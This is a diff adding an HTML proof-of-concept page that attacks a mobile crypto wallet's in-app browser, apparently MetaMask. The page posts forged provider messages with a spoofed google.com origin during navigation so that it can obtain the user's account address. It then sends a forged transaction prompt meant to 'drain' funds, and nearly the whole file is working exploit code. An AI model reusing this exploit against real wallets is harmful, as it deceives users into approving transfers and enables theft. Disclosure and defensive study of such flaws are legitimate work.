@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC</title>
+</head>
+<body>
+<button id="go">RUN</button>
+<pre id="log"></pre>
+<script>
+const URL_204 = 'https://www.google.com/csi';
+const SPOOF = 'https://www.google.com';
+const TO = '0x000000000000000000000000000000000000dEaD';
+const VAL = '0x' + BigInt(1e15).toString(16);
+
+const log = m => document.getElementById('log').textContent += new Date().toISOString().slice(11,23) + ' ' + m + '\n';
+const post = p => window.ReactNativeWebView.postMessage(JSON.stringify(p));
+const phase = new URL(location.href).searchParams.get('p');
+
+let leaked = null;
+
+(async () => {
+  while (!window.ethereum) await new Promise(r => setTimeout(r, 500));
+
+  window.ethereum.on('accountsChanged', a => {
+    log('leak: ' + JSON.stringify(a));
+    if (a?.[0]) leaked = a[0];
+  });
+
+  if (phase === '2') {
+    document.getElementById('go').style.display = 'none';
+    log('post-approval leak + drain');
+
+    setTimeout(() => {
+      log('→ F1 #2 for leak');
+      location.href = URL_204;
+
+      setTimeout(() => {
+        if (!leaked) { log('no leak captured ?'); return; }
+        log('captured: ' + leaked);
+        log('→ forged eth_sendTransaction');
+        post({
+          name: 'metamask-provider',
+          origin: SPOOF,
+          data: { jsonrpc:'2.0', id:2, method:'eth_sendTransaction',
+            params:[{ from:leaked, to:TO, value:VAL, gas:'0x5208' }] }
+        });
+        log('approve tx prompt for drain');
+      }, 2500);
+    }, 500);
+  }
+})();
+
+document.getElementById('go').onclick = () => {
+  log('connect ...');
+  location.href = URL_204;
+
+  setTimeout(() => {
+    log('→ forged eth_requestAccounts (origin=' + SPOOF + ')');
+    post({
+      name: 'metamask-provider',
+      origin: SPOOF,
+      data: { jsonrpc:'2.0', id:1, method:'eth_requestAccounts', params:[] }
+    });
+    log('approve connect prompt. i got u :) ');
+
+    setTimeout(() => {
+      const u = new URL(location.href);
+      u.searchParams.set('p', '2');
+      location.href = u.toString();
+    }, 1000);
+  }, 2000);
+};
+</script>
+</body>
+</html>
